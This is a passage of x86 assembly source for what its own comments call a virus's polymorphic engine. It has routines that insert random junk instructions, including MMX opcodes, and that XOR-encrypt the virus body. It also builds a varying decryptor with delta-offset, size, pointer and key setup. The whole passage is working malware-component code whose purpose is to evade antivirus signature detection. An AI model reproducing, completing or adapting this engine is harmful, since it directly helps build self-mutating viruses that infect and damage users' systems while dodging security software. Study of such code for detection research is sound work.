       bt      word ptr [ebp+@@flags],@LOADKEY
       jc      @@gen_before_loop
       call    @@gen_loadkey
       ret

   @@try_passkey2mmx:
       bt      word ptr [ebp+@@flags],@PASSKEY2MMX
       jc      @@gen_before_loop
       bt      word ptr [ebp+@@flags],@LOADKEY
       jnc     @@gen_before_loop
       call    @@gen_passkey2mmx
       ret

   @@gen_before_loop_non_mmx:
           call    r_range,04h
       or      eax,eax                         ; 0
       jz      @@try_deltaoffset_non_mmx
       dec     eax                             ; 1
       jz      @@try_loadsize_non_mmx
       dec     eax                             ; 2
       jz      @@try_loadpointer_non_mmx
       jmp     @@try_loadkey_non_mmx

   @@try_deltaoffset_non_mmx:
       bt      word ptr [ebp+@@flags],@DELTAOFFSET
       jc      @@gen_before_loop
       call    @@gen_deltaoffset
       ret

   @@try_loadsize_non_mmx:
       bt      word ptr [ebp+@@flags],@LOADSIZE
       jc      @@gen_before_loop
       call    @@gen_loadsize
       ret

   @@try_loadpointer_non_mmx:
       bt      word ptr [ebp+@@flags],@LOADPOINTER
       jc      @@gen_before_loop
       bt      word ptr [ebp+@@flags],@DELTAOFFSET
       jnc     @@gen_before_loop
       call    @@gen_loadpointer
       ret

   @@try_loadkey_non_mmx:
       bt      word ptr [ebp+@@flags],@LOADKEY
       jc      @@gen_before_loop
       call    @@gen_loadkey
       ret

   ; --- Encrypt data (very very weak, i know, but i don't care anyway)

   @@crypt_data:
       mov     ecx,dword ptr [ebp+@@size2cryptd4]
       mov     ebx,dword ptr [ebp+@@enc_key]
       mov     edi,dword ptr [ebp+@@ptr_data2enc]
       mov     esi,edi
   @@cl00p:lodsd
       xor     eax,ebx
       stosd
       loop    @@cl00p
       ret

   ; --- Garbage generators

   @@gen_garbage:
       inc     byte ptr [ebp+@@recursion]
       cmp     byte ptr [ebp+@@recursion],RECURSION
       jae     @@gg_exit

       cmp     byte ptr [ebp+@@init_mmx?],00h
       ja      @@gg_mmx
   @@gg_non_mmx:
           mov     eax,@@non_mmx_gbg
       jmp     @@gg_doit
   @@gg_mmx:
       mov     eax,@@s_gbgtbl
   @@gg_doit:
           call    r_range,eax
       lea     ebx,[ebp+@@gbgtbl]
       mov     eax,[ebx+eax*4]
       add     eax,ebp
       call    eax

   @@gg_exit:
       dec     byte ptr [ebp+@@recursion]
       ret

   @@gen_some_garbage:
       mov     ecx,nGARBAGE
   @@gsg_l00p:
       push    ecx
       call    @@gen_garbage
       pop     ecx
       loop    @@gsg_l00p
   @@slip: ret

   ; =========== GARBAGERS ===========
   ; (the best of this engine i think)
   ; =================================

   ; Arithmetic register (16/32) to register (16/32)

   @@gen_arithmetic_regx_regx:
           call    @@over_arxrx
           dd      offset  (@@gen_arithmetic_reg16_reg16)
           dd      offset  (@@gen_arithmetic_reg32_reg32)
   @@over_arxrx:
           pop     ebx
           call    r_range,02h
           mov     eax,dword ptr [ebx+eax*4]
           add     eax,ebp
           jmp     eax

   @@gen_arithmetic_reg16_reg16:
           mov     al,66h
           stosb
           call    @@gen_arithmetic_reg32_reg32
           ret

   @@gen_arithmetic_reg32_reg32:
           call    random
           and     al,00111000b
           cmp     al,00111000b
           jz      @@gen_arithmetic_reg32_reg32
           or      al,00000011b
           stosb

   @@gar32r32:
           call    @@get_register
   @@gar_shit:
           shl     eax,3
           or      al,11000000b
           push    eax
           call    random
           and     al,00000111b
           xchg    ebx,eax
           pop     eax
           or      al,bl
           stosb
           ret

   ; Arithmetic immediate (BYTE/WORD/DWORD) to register (16/32)

   @@gen_arithmetic_regx_immx:
           call    @@over_arxix
           dd      offset  (@@gen_arithmetic_reg16_imm16)
           dd      offset  (@@gen_arithmetic_reg32_imm32)
   @@over_arxix:
           pop     ebx
           call    r_range,02h
           mov     eax,dword ptr [ebx+eax*4]
           add     eax,ebp
           jmp     eax

   @@gen_arithmetic_reg16_imm16:
           mov     al,66h
           stosb
           call    @@gen_arithmetic_reg32_imm32
           dec     edi
           dec     edi
           ret

   @@gen_arithmetic_reg32_imm32:
           mov     al,81h
           stosb

           call    @@get_register
           or      al,al
           jz      @@gen_arithmetic_eax_imm32
           push    eax
   @@avoid_cmp4:
           call    random
           and     al,00111000b
           cmp     al,00111000b
           jz      @@avoid_cmp4
           or      al,11000000b
           pop     ebx
           or      al,bl
           stosb
           call    random
           stosd
           ret

   @@gen_arithmetic_eax_imm32:
           dec     edi
   @@avoid_cmp5:
           call    random
           and     al,00111000b
           cmp     al,00111000b
           jz      @@avoid_cmp5
           or      al,00000101b
           stosb
           call    random
           stosd
           ret

   ; MOV immediate (BYTE/WORD/DWORD) to register (16/32)

   @@gen_mov_regx_immx:
           call    @@over_mrxix
           dd      offset  (@@gen_mov_reg16_imm16)
           dd      offset  (@@gen_mov_reg32_imm32)
   @@over_mrxix:
           pop     ebx
           call    r_range,02h
           mov     eax,dword ptr [ebx+eax*4]
           add     eax,ebp
           jmp     eax

   @@gen_mov_reg16_imm16:
           mov     al,66h
           stosb
           call    @@gen_mov_reg32_imm32
           dec     edi
           dec     edi
           ret

   @@gen_mov_reg32_imm32:
           call    @@get_register
           add     al,0B8h
           stosb
           call    random
           stosd
           ret

   ; MOV register (16/32) to register (16/32)

   @@gen_mov_regx_regx:
           call    @@over_mrxrx
           dd      offset  (@@gen_mov_reg16_reg16)
           dd      offset  (@@gen_mov_reg32_reg32)
   @@over_mrxrx:
           pop     ebx
           call    r_range,02h
           mov     eax,dword ptr [ebx+eax*4]
           add     eax,ebp
           jmp     eax

   @@gen_mov_reg16_reg16:
           mov     al,66h
           stosb
   @@gen_mov_reg32_reg32:
           mov     al,8Bh
           stosb
           call    @@get_register
   @@gmov_rib:
           push    eax
   @@gmr2: call    random
           and     eax,00000111b
           cmp     al,byte ptr [esp]
           jz      @@gmr2
           pop     ebx
           shl     ebx,3
           or      al,bl
           or      al,11000000b
           stosb
           ret

   ; MOVZX/MOVSX register (32),register (16)

   @@gen_movzx_movsx:
           call    @@gmzxmsx
           dd      offset  (@@gen_movzx_reg32_reg16)
           dd      offset  (@@gen_movsx_reg32_reg16)
   @@gmzxmsx:
           pop     ebx
           call    r_range,02h
           mov     eax,dword ptr [ebx+eax*4]
           add     eax,ebp
           jmp     eax

   @@gen_movzx_reg32_reg16:
           mov     ax,0B70Fh
           stosw
           jmp     @@movzx_movsx_rib

   @@gen_movsx_reg32_reg16:
           mov     ax,0BF0Fh
           stosw
   @@movzx_movsx_rib:
           call    @@get_register
           shl     eax,3
           push    eax
           call    random
           and     eax,00000111b
           pop     ebx
           or      al,bl
           or      al,11000000b
           stosb
           ret

   ; PUSH immediate (WORD/DWORD), garbage, POP register (16/32)

   @@gen_push_immx_pop_regx:
           call    @@gpixprx
           dd      offset  (@@gen_push_imm16_pop_reg16)
           dd      offset  (@@gen_push_imm32_pop_reg32)
   @@gpixprx:
           pop     ebx
           call    r_range,02h
           mov     eax,dword ptr [ebx+eax*4]
           add     eax,ebp
           jmp     eax

   @@gen_push_imm16_pop_reg16:
           mov     ax,6866h
           stosw
           call    random
           stosw

           call    @@gen_garbage

           mov     al,66h
           stosb
           call    @@get_register
           add     eax,58h
           stosb
           ret

   @@gen_push_imm32_pop_reg32:
           mov     al,68h
           stosb
           call    random
           stosd

           call    @@get_register
           add     eax,58h
           stosb
           ret

   ; PUSH register/segment (16/32), garbage, POP register (16/32)

   @@gen_push_regx_pop_regx:
           call    @@gprxprx
           dd      offset  (@@gen_push_reg16_pop_reg16)
           dd      offset  (@@gen_push_reg32_pop_reg32)
   @@gprxprx:
           pop     ebx
           call    r_range,02h
           mov     eax,dword ptr [ebx+eax*4]
           add     eax,ebp
           jmp     eax

   @@gen_push_reg16_pop_reg16:
           mov     al,66h
           stosb
           call    r_range,08h
           or      al,50h
           stosb

           call    @@gen_some_garbage

           mov     al,66h
           stosb
           call    @@get_register
           or      al,58h
           stosb
           ret

   @@gen_push_reg32_pop_reg32:
           call    r_range,09h
           or      eax,eax
           jz      @@gen_strange_push
           dec     eax
           or      al,50h                          ; Push REG32
           stosb
   @@put_pop32:
           call    @@gen_some_garbage

           call    @@get_register
           or      al,58h                          ; Pop REG32
           stosb
           ret

   @@gen_strange_push:
           call    r_range,03h
           xchg    eax,ecx
           jecxz   @@gen_push_gs_or_fs
           dec     ecx
           jecxz   @@gen_push_es_or_ss
   @@gen_push_cs_or_ds:
           mov     al,0Eh                          ; Put PUSH CS
           call    f_random
           jz      @@put_push
           or      al,10h                          ; Put PUSH DS
   @@put_push:
           stosb
           jmp     @@put_pop32

   @@gen_push_es_or_ss:
           mov     al,06h                          ; Put PUSH ES
           call    f_random
           jz      @@put_push
           or      al,10h                          ; Put PUSH SS
           jmp     @@put_push

   @@gen_push_gs_or_fs:
           mov     ax,0A00Fh                       ; Put PUSH FS
           call    f_random
           jz      @@put_push2
           or      ah,08h                          ; Put PUSH GS
   @@put_push2:
           stosw
           jmp     @@put_pop32

   ; CMP/TEST imm (BYTE/WORD/DWORD) or reg (16/32) with reg (16/32) and jx

   @@gen_comparison_jx:
           call    @@gcjx
           dd      offset  (@@gen_cmp_regx_regx)
           dd      offset  (@@gen_cmp_regx_immx)
           dd      offset  (@@gen_test_regx_regx)
           dd      offset  (@@gen_test_regx_immx)
   @@gcjx:
           pop     ebx
           call    r_range,04h
           mov     eax,dword ptr [ebx+eax*4]
           add     eax,ebp
           jmp     eax

   @@gen_cmp_regx_regx:
           call    @@gcrxrx
           dd      offset  (@@gen_cmp_reg16_reg16)
           dd      offset  (@@gen_cmp_reg32_reg32)
   @@gcrxrx:
           pop     ebx
           call    r_range,02h
           mov     eax,dword ptr [ebx+eax*4]
           add     eax,ebp
           jmp     @@call_eax&build_jmp

   @@gen_cmp_reg16_reg16:
           mov     al,66h
           stosb

   @@gen_cmp_reg32_reg32:
           mov     al,00111011b
           stosb
           jmp     @@gar32r32

   @@gen_cmp_regx_immx:
           call    @@gcrxix
           dd      offset  (@@gen_cmp_reg16_imm16)
           dd      offset  (@@gen_cmp_reg32_imm32)
   @@gcrxix:
           pop     ebx
           call    r_range,02h
           mov     eax,dword ptr [ebx+eax*4]
           add     eax,ebp
   @@call_eax&build_jmp:
           call    eax
           call    r_range,10h
           add     al,70h
           stosb
           xor     eax,eax

           push    edi
           stosb
           call    @@gen_garbage
           pop     edx

           mov     ebx,edi
           sub     ebx,edx
           dec     ebx
           mov     byte ptr [edx],bl
           ret

   @@gen_cmp_al_imm8:
           dec     edi
           mov     al,00111100b
           stosb
           call    random
           stosb
           ret

   @@gen_cmp_reg16_imm16:
           mov     al,66h
           stosb
           call    @@gen_cmp_reg32_imm32
           dec     edi
           dec     edi
           ret

   @@gen_cmp_reg32_imm32:
           mov     al,81h
           stosb

           call    @@get_register
           or      al,al
           jz      @@gen_cmp_eax_imm32
           push    eax
           or      al,11111000b
           pop     ebx
           or      al,bl
           stosb
           call    random
           stosd
           ret

   @@gen_cmp_eax_imm32:
           dec     edi
           mov     al,00111101b
           stosb
           call    random
           stosd
           ret

   @@gen_test_regx_regx:
           call    @@gtrxrx
           dd      offset  (@@gen_test_reg16_reg16)
           dd      offset  (@@gen_test_reg32_reg32)
   @@gtrxrx:
           pop     ebx
           call    r_range,02h
           mov     eax,dword ptr [ebx+eax*4]
           add     eax,ebp
   @@call_eax&choose_jz_or_jnz:
           call    eax
           mov     al,74h
           call    f_random
           jz      @@put_a_jz
           inc     eax
   @@put_a_jz:
           stosb

           xor     eax,eax

           push    edi
           stosb
           call    @@gen_garbage
           pop     edx

           mov     ebx,edi
           sub     ebx,edx
           dec     ebx
           mov     byte ptr [edx],bl
           ret

   @@gen_test_reg16_reg16:
           mov     al,66h
           stosb

   @@gen_test_reg32_reg32:
           mov     al,85h
           stosb
           jmp     @@gar32r32

   @@gen_test_regx_immx:
           call    @@gtrxix
           dd      offset  (@@gen_test_reg16_imm16)
           dd      offset  (@@gen_test_reg32_imm32)
   @@gtrxix:
           pop     ebx
           call    r_range,02h
           mov     eax,dword ptr [ebx+eax*4]
           add     eax,ebp
           jmp     @@call_eax&choose_jz_or_jnz

   @@gen_test_reg16_imm16:
           mov     al,66h
           stosb
           call    @@gen_test_reg32_imm32
           dec     edi
           dec     edi
           ret

   @@gen_test_reg32_imm32:
           mov     al,0F7h
           stosb

           call    @@get_register
           or      al,al
           jz      @@gen_test_eax_imm32
           push    eax
           or      al,11000000b
           pop     ebx
           or      al,bl
           stosb
           call    random
           stosd
           ret

   @@gen_test_eax_imm32:
           dec     edi
           mov     al,0A9h
           stosb
           call    random
           stosd
           ret

   ; CALL to subroutines

   @@gen_subroutine:
           mov     al,0E8h                         ; Construct normal subroutine
           stosb                                   ; ---------------------------
           stosd
           push    edi                             ; Here we build the temporal
           call    @@gen_garbage                   ; call, some garbage, the
           mov     al,0E9h                         ; temporal jump over the call
           stosb                                   ; and more shit.
           stosd
           push    edi

   ;       call    @@add_to_call_array             ; Add to our subroutine array

           call    @@gen_some_garbage             ; Put some garbage as the
           mov     al,0C3h                         ; body of the subr. plus a RET
           stosb
           call    @@gen_garbage                   ; After RET, more garbage!

           mov     ebx,edi                         ; Now fix all the CALL & JMP
           pop     edx                             ; addresses made in the subr.
           sub     ebx,edx                         ; building stage, i.e. pass
           mov     [edx-4],ebx                     ; them from temporal to
           pop     ecx                             ; definitive...
           sub     edx,ecx
           mov     [ecx-4],edx
           dec     byte ptr [ebp+@@inside_call]
           ret

   ; Generate strange and non-realistic opcodes

   @@gen_weird_opcodes:
           call    r_range,05h                     ; 25% of rate if we arrived
           or      eax,eax                         ; here of put weird things...
           jz      @@do_it_weird
           ret

   @@do_it_weird:
           call    @@gwo
   @@top:
           dd      offset  (@@gen_bswap_reg32)
           dd      offset  (@@gen_imul_reg16_reg16_imm16)
           dd      offset  (@@gen_imul_reg32_reg32_imm32)
           dd      offset  (@@gen_btx_reg16_reg16)
           dd      offset  (@@gen_btx_reg32_reg32)
           dd      offset  (@@gen_incdec_reg16_reg16)
           dd      offset  (@@gen_incdec_reg32_reg32)
           dd      offset  (@@gen_not_neg_reg16)
           dd      offset  (@@gen_not_neg_reg32)
   @@gwo:
           pop     ebx
           call    r_range,((offset @@gwo-offset @@top)/4)
           mov     eax,dword ptr [ebx+eax*4]
           add     eax,ebp
           jmp     eax

   @@gen_bswap_reg32:
           mov     al,0Fh
           stosb
           call    @@get_register
           or      al,0C8h
           stosb
           ret

   @@gen_imul_reg16_reg16_imm16:
           mov     al,66h
           stosb
           call    @@gen_imul_reg32_reg32_imm32
           dec     edi
           dec     edi
           ret

   @@gen_imul_reg32_reg32_imm32:
           mov     al,69h
           stosb
           call    @@get_register
           shl     eax,3
           push    eax
           call    r_range,08h
           pop     ebx
           or      bl,al
           or      bl,11000000b
           xchg    eax,ebx
           stosb
           call    random
           stosd
           ret

   @@gen_btx_reg16_reg16:
           mov     al,66h
           stosb
   @@gen_btx_reg32_reg32:
           mov     al,0Fh
           stosb
           call    r_range,03h
           xchg    eax,ecx
           jecxz   @@gen_bsr_or_bsf
           dec     ecx
           jecxz   @@gen_bts_or_btc
   @@gen_bt_or_btr:
           mov     al,0A3h
           call    f_random
           jz      @@put_btx__
           inc     byte ptr [ebp+@@it_was_bt]
           jmp     @@put_btx
   @@put_btx__:
           add     al,10h
   @@put_btx:
           stosb
           call    @@get_register
           or      al,11000000b
           push    eax
           call    r_range,08h
           shl     eax,3
           pop     ebx
           or      al,bl
           stosb
           cmp     byte ptr [ebp+@@it_was_bt],01h
           jz      @@was_bt
           ret
   @@was_bt:
           dec     byte ptr [ebp+@@it_was_bt]
           mov     al,72h
           call    f_random
           jz      @@put_j?c
           inc     eax
   @@put_j?c:
           stosb
           push    edi
           stosb
           call    @@gen_garbage
           pop     edx

           mov     ebx,edi
           sub     ebx,edx
           dec     ebx
           mov     byte ptr [edx],bl
           ret

   @@gen_bts_or_btc:
           mov     al,0ABh
           call    f_random
           jz      @@put_btx
           add     al,10h
           jmp     @@put_btx

   @@gen_bsr_or_bsf:
           mov     al,0BCh
           call    f_random
           jz      @@put_btx_
           inc     eax
   @@put_btx_:
           stosb
           call    @@get_register
           shl     eax,3
           or      al,11000000b
           push    eax
           call    r_range,08h
           pop     ebx
           or      al,bl
           stosb
           ret

   @@gen_incdec_reg16_reg16:
           mov     al,66h
           stosb
   @@gen_incdec_reg32_reg32:
           call    @@get_register
           add     al,40h                          ; Make it INC
           call    f_random
           jz      @@put_incdec
           add     al,08h                          ; Make it DEC
   @@put_incdec:
           stosb
           ret

   @@gen_not_neg_reg16:
           mov     al,66h
           stosb
   @@gen_not_neg_reg32:
           mov     al,0F7h
           stosb
           call    @@get_register
   @@put_neg_not1:
           add     al,0D0h                         ; Make it NOT
           call    f_random
           jz      @@put_neg_not
           add     al,08h                          ; Make it NEG
   @@put_neg_not:
           stosb
           ret

   ; Generate simple calls to subroutines

   @@gen_call_to_subroutine:
       mov     al,0E8h
       stosb
       xor     eax,eax
       stosd
       push    edi
       call    @@gen_garbage
       mov     al,0E9h
       stosb
       xor     eax,eax
       stosd
       push    edi
       call    @@gen_garbage
       mov     al,0C3h
       stosb
       call    @@gen_garbage
       mov     ebx,edi
       pop     edx
       sub     ebx,edx
       mov     [edx-4],ebx
       pop     ecx
       sub     edx,ecx
       mov     [ecx-4],edx
       ret

   ; Generate many possible ways for make a determinated register to be 0:
   ; XOR REG,REG/SUB REG,REG/PUSH 0 POP REG/AND REG,0/MOV REG,0

   @@gen_zer0_reg:
       call    @@get_register                  ; For garbage generators
   @@gen_zero_reg:
       push    eax
           call    r_range,06h
       pop     ecx
       xchg    eax,ecx
       jecxz   @@xor_reg_reg
       dec     ecx
       jecxz   @@sub_reg_reg
       dec     ecx
       jecxz   @@push_0_pop_reg
       dec     ecx
       jecxz   @@and_reg_0
       dec     ecx
       jecxz   @@mov_reg_0
   @@or_reg_m1_inc_reg:
       push    eax
       cmp     al,_EAX
       jnz     @@or_reg_m1
   @@or_eax_m1:
       mov     al,0Dh                          ; OR EAX,-1
       stosb
       xor     eax,eax
       dec     eax
       stosd
       jmp     @@orm1ir_inc_reg
   @@or_reg_m1:
       xchg    eax,ebx
       mov     ax,0C883h                       ; OR REG,-1
       or      ah,bl
       stosw
       xor     eax,eax
       dec     eax
       stosb
       xchg    eax,ebx
   @@orm1ir_inc_reg:
       pop     eax
       add     al,40h                          ; INC REG
       stosb
       ret

   @@xor_reg_reg:
       xchg    eax,ebx
       mov     ax,0C033h                       ; XOR REG,REG
       or      ah,bl
       shl     ebx,3
       or      ah,bl
       stosw
       ret

   @@sub_reg_reg:
       xchg    eax,ebx
       mov     ax,0C02Bh                       ; SUB REG,REG
       or      ah,bl
       shl     ebx,3
       or      ah,bl
       stosw
       ret

   @@push_0_pop_reg:
       push    eax
       mov     ax,006Ah                        ; PUSH 00h
       stosw                                   ; POP REG
       pop     eax
       add     al,58h
       stosb
       ret

   @@and_reg_0:
       cmp     al,_EAX
       jnz     @@and_regnoteax_0
   @@and_eax_0:
       mov     al,25h
       stosb
       xor     eax,eax
       stosd
       ret
   @@and_regnoteax_0:
       xchg    eax,ebx
       mov     ax,0E083h                       ; AND REG,00
       or      ah,bl
       stosw
       xor     eax,eax
       stosb
       ret

   @@mov_reg_0:
       add     al,0B8h                         ; MOV REG,00000000
       stosb
       xor     eax,eax
       stosd
       ret

   ; MMX Group 1:
   ;
   ; PUNPCKLBW/PUNPCKLWD/PUNPCKLDQ/PACKSSWB/PCMPGTB/PCMPGTW/PCMPGTD/PACHUSWB
   ; PUNPCKHBW/PUNPCKHWD/PUNPCKHDQ/PACKSSDW

   @@gen_mmx_group1:
       mov     bx,600Fh
           call    r_range,0Ch
       add     bh,al
       xchg    eax,ebx
       stosw
       call    @@build_mmx_gbg_rib
       ret

   @@gen_mmx_movq_mm?_mm?:
       mov     ax,6F0Fh                        ; MOVQ MM?,MM?
       stosw
       call    @@build_mmx_gbg_rib
       ret

   @@gen_mmx_movd_mm?_reg32:
       mov     ax,7E0Fh                        ; MOVD MM?,E??
       stosw
       call    @@get_mmx_register
       shl     eax,3
       push    eax
       call    @@get_register
       xchg    eax,ebx
       pop     eax
       or      al,bl
       or      al,11000000b
       stosb
       ret

   ; MMX Group 2:
   ;
   ; PCMPEQB/PCMPEQW/PCMPEQD

   @@gen_mmx_group2:
       mov     al,0Fh
       stosb
           call    r_range,03h
       add     al,74h
       stosb
       call    @@build_mmx_gbg_rib
       ret

   ; MMX Group 3:
   ;
   ; PSRLW/PSRLD/PSRLQ/PMULLW/PSUBUSB/PSUBUSW/PAND/PADDUSB/PADDUSW/PANDN/PSRAW
   ; PSRAD/PMULHW/PSUBSB/PSUBSW/POR/PADDSB/PADDSW/PXOR/PSLLW/PSLLD/PSLLQ/PMULADDWD

   @@gen_mmx_group3:
       mov     al,0Fh
       stosb
       call    @@__overshit
   @@eoeo: db      0D1h,0D2h,0D3h,0D5h,0D8h,0D9h,0DBh,0DCh,0DDh,0DFh
       db      0E1h,0E2h,0E5h,0E8h,0E9h,0EBh,0ECh,0EDh,0EFh
       db      0F1h,0F2h,0F5h
   sg3tbl  equ     ($-offset @@eoeo)
   @@__overshit:
       pop     esi
           call    r_range,sg3tbl
       mov     al,byte ptr [esi+eax]
       stosb
       call    @@build_mmx_gbg_rib
   @@gmmx_goaway:
       ret

   @@build_mmx_gbg_rib:
       call    @@get_mmx_register
       shl     eax,3
       push    eax
       call    @@get_mmx_register
       xchg    eax,ebx
       pop     eax
       or      eax,ebx
       or      al,11000000b
       stosb
       ret

   ; --- Decryptor code generators

   ; Generate the routine for check for MMX presence, that should perform exactly
   ; the same action of the following code:
   ;       MOV     EAX,1
   ;       CPUID
   ;       BT      EDX,17h
   ;       JNC     NOT_MMX

   @@gen_check4mmx:
       mov     eax,08h
           call    r_range,08h
       xchg    eax,ecx
       jecxz   @@c4mmx_a_@@1
       dec     ecx
       jecxz   @@c4mmx_a_@@2
       dec     ecx
       jecxz   @@c4mmx_a_@@3
       dec     ecx
       jecxz   @@c4mmx_a_@@4
       dec     ecx
       jecxz   @@c4mmx_a_@@5
       dec     ecx
       jecxz   @@c4mmx_a_@@6
       dec     ecx
       jecxz   @@c4mmx_a_@@7
   @@c4mmx_a_@@8:
       xor     eax,eax                         ; ZERO EAX
       call    @@gen_zero_reg                  ; SUB EAX,-1
       mov     al,2Dh
       stosb
       xor     eax,eax
       dec     eax
       stosd
       jmp     @@c4mmx_over_a
   @@c4mmx_a_@@7:
       xor     eax,eax                         ; ZERO EAX
       call    @@gen_zero_reg                  ; ADD EAX,1
       mov     al,05h
       stosb
       xor     eax,eax
       inc     eax
       stosd
       jmp     @@c4mmx_over_a
   @@c4mmx_a_@@6:
       xor     eax,eax                         ; ZERO EAX
       call    @@gen_zero_reg                  ; STC
       mov     ax,1DF9h                        ; SBB EAX,-2
       stosw
       xor     eax,eax
       dec     eax
       dec     eax
       stosd
       jmp     @@c4mmx_over_a
   @@c4mmx_a_@@5:
       xor     eax,eax                         ; ZERO EAX
       call    @@gen_zero_reg                  ; STC
       mov     ax,15F9h                        ; ADC EAX,00000000
       stosw
       xor     eax,eax
       stosd
       jmp     @@c4mmx_over_a
   @@c4mmx_a_@@4:
       mov     al,0Dh                          ; OR EAX,-1
       stosb                                   ; AND EAX,1
       xor     eax,eax
       dec     eax
       stosd
       mov     al,25h
       stosb
       xor     eax,eax
       inc     eax
       stosd
       jmp     @@c4mmx_over_a
   @@c4mmx_a_@@3:
       mov     eax,9058016Ah                   ; PUSH 01
       stosd                                   ; POP EAX
       dec     edi
       jmp     @@c4mmx_over_a
   @@c4mmx_a_@@2:
       xor     eax,eax
       call    @@gen_zero_reg                  ; ZERO EAX
       mov     al,40h                          ; INC EAX
       stosb
       jmp     @@c4mmx_over_a
   @@c4mmx_a_@@1:
       mov     al,0B8h                         ; MOV EAX,1
       stosb
       xor     eax,eax
       inc     eax
       stosd
   @@c4mmx_over_a:
       call    @@gen_garbage

       mov     ax,0A20Fh                       ; CPUID
       stosw

       call    @@clear_mask
       mov     byte ptr [ebp+@@reg_mask],_EDX

       call    @@gen_garbage

           call    r_range,03h
       or      eax,eax
       jz      @@c4mmx_b_@@3
       dec     eax
       jz      @@c4mmx_b_@@2

   @@c4mmx_b_@@1:
       mov     eax,17E2BA0Fh                   ; BT EDX,17h
       stosd                                   ; JC $+??
       mov     al,72h
       stosb
       jmp     @@c4mmx_over_b
   @@c4mmx_b_@@2:
       mov     eax,0000C2F7h                   ; TEST EDX,00400000h
       stosd                                   ; JZ $+??
       mov     eax,00740040h
       stosd
       dec     edi
       jmp     @@c4mmx_over_b
   @@c4mmx_b_@@3:
       mov     eax,7218EAC1h                   ; SHR EDX,18h
       stosd                                   ; JC $+??
   @@c4mmx_over_b:
       push    edi
       inc     edi                             ; Fake data for temp. fill

       call    @@gen_garbage

       mov     al,0e9h                         ; RET
       stosb

       mov     dword ptr [ebp+@@ptrto2nd],edi
       xor     eax,eax
       stosd

       call    @@gen_garbage

       pop     ebx
       mov     edx,edi
       sub     edx,ebx
       dec     edx
       mov     byte ptr [ebx],dl

       inc     byte ptr [ebp+@@init_mmx?]

       or      word ptr [ebp+@@flags],_CHECK4MMX
       ret

   ; Generate a routine for get the pseudo delta-offset, which will look like
   ; this one:
   ;       CALL    @@1
   ;       [...]
   ;  @@1: POP     REG

   @@gen_deltaoffset:
           call    r_range,10h
       xchg    eax,ebx
       mov     al,0E8h
       stosb
       xor     eax,eax
       stosd
       mov     dword ptr [ebp+@@tmp_call],edi
       call    @@gen_garbage
       mov     ecx,dword ptr [ebp+@@tmp_call]
       mov     ebx,edi
       sub     ebx,ecx
       mov     [ecx-4],ebx
       mov     al,58h
       add     al,byte ptr [ebp+@@reg_delta]
       stosb
       mov     ebx,dword ptr [ebp+@@ptr_buffer]
       sub     ecx,ebx
       mov     dword ptr [ebp+@@fix1],ecx
       or      word ptr [ebp+@@flags],_DELTAOFFSET
       ret

   ; Generate a routine for put in the register used as counter the size of the
   ; code we want to decrypt

   @@gen_loadsize:
       or      word ptr [ebp+@@flags],_LOADSIZE
           call    r_range,02h
       xchg    eax,ecx
       jecxz   @@gls_@@2
   @@gls_@@1:
       mov     al,68h                          ; PUSH size
       stosb                                   ; POP reg_size
       mov     dword ptr [ebp+@@size_address],edi
       mov     eax,dword ptr [ebp+@@size2cryptd4]
       stosd
       call    @@gen_garbage
       mov     al,58h
       add     al,byte ptr [ebp+@@reg_counter]
       stosb
       ret
   @@gls_@@2:
       movzx   eax,byte ptr [ebp+@@reg_counter]
       add     eax,0B8h                        ; MOV reg_size,size
       stosb
       mov     dword ptr [ebp+@@size_address],edi
       mov     eax,dword ptr [ebp+@@size2cryptd4]
       stosd
       ret

   ; Generate the code that will make the pointer register to point exactly to
   ; the beginning of the code we want to encrypt or decrypt

   @@gen_loadpointer:
       mov     eax,LIMIT
       sub     eax,dword ptr [ebp+@@fix1]
       mov     dword ptr [ebp+@@fix2],eax

           call    r_range,03h
       or      eax,eax
       jz      @@lp_@@3
       dec     eax
       jz      @@lp_@@2
   @@lp_@@1:
       mov     al,8Dh                          ; LEA reg_ptr,[reg_delta+fix]
       stosb
       movzx   eax,byte ptr [ebp+@@reg_ptr2data]
       shl     al,3
       add     al,10000000b
       add     al,byte ptr [ebp+@@reg_delta]
       stosb
       jmp     @@lp_
   @@lp_@@2:
       mov     al,8Bh                          ; MOV reg_ptr,reg_delta
       stosb                                   ; ADD reg_ptr,fix
       movzx   eax,byte ptr [ebp+@@reg_ptr2data]
       shl     eax,3
       or      al,byte ptr [ebp+@@reg_delta]
       or      al,11000000b
       stosb
       call    @@gen_garbage
       mov     al,81h
       stosb
       mov     al,0C0h
       or      al,byte ptr [ebp+@@reg_ptr2data]
       stosb
       jmp     @@lp_
   @@lp_@@3:
       call    @@clear_mask                    ; MOV reg_mask,fix2
       call    @@get_register                  ; LEA reg_ptr,[reg_mask+reg_delta+(fix+fix2)]
       mov     byte ptr [ebp+@@reg_mask],al

       add     al,0B8h
       stosb
       call    random
       stosd

       push    eax
       call    @@gen_garbage
       pop     edx

       sub     dword ptr [ebp+@@fix2],edx

       mov     al,8Dh
       stosb
       movzx   eax,byte ptr [ebp+@@reg_ptr2data]
       shl     eax,3
       or      al,10000100b
       stosb
       movzx   eax,byte ptr [ebp+@@reg_mask]
       shl     eax,3
       or      al,byte ptr [ebp+@@reg_delta]
       stosb

   @@lp_:
       mov     eax,dword ptr [ebp+@@fix2]
       stosd
       or      word ptr [ebp+@@flags],_LOADPOINTER
       ret

   ; Put in the register used as key the number used for the encryption of the
   ; virus code.

   @@gen_loadkey:
           call    r_range,02h
       xchg    eax,ecx
       jecxz   @@glk_@@2
   @@glk_@@1:
       mov     al,68h                          ; PUSH enc_key
       stosb                                   ; POP reg_key
       mov     eax,dword ptr [ebp+@@enc_key]
       stosd
       call    @@gen_garbage
       mov     al,58h
       add     al,byte ptr [ebp+@@reg_key]
       stosb
       or      word ptr [ebp+@@flags],_LOADKEY
       ret
   @@glk_@@2:                                      ; MOV key_reg,enc_key
       movzx   eax,byte ptr [ebp+@@reg_key]
       add     eax,0B8h
       stosb
       mov     eax,dword ptr [ebp+@@enc_key]
       stosd
       or      word ptr [ebp+@@flags],_LOADKEY
       ret

   ; Generate the code for pass the encryption key to an MMX register

   @@gen_passkey2mmx:
       mov     ax,6E0Fh                        ; MOV mmx_key,reg_key
       stosw
       movzx   eax,byte ptr [ebp+@@mmx_key]
       shl     eax,3
       or      al,byte ptr [ebp+@@reg_key]
       or      al,11000000b
       stosb
       or      word ptr [ebp+@@flags],_PASSKEY2MMX
       ret

   ; Just for know where we must loop the decryptor

   @@getloopaddress:
       mov     dword ptr [ebp+@@l00paddress],edi
       ret

   ; Pass the dword of code we are decrypting to the MMX register used for that
   ; matter

   @@gen_passptr2mmx:
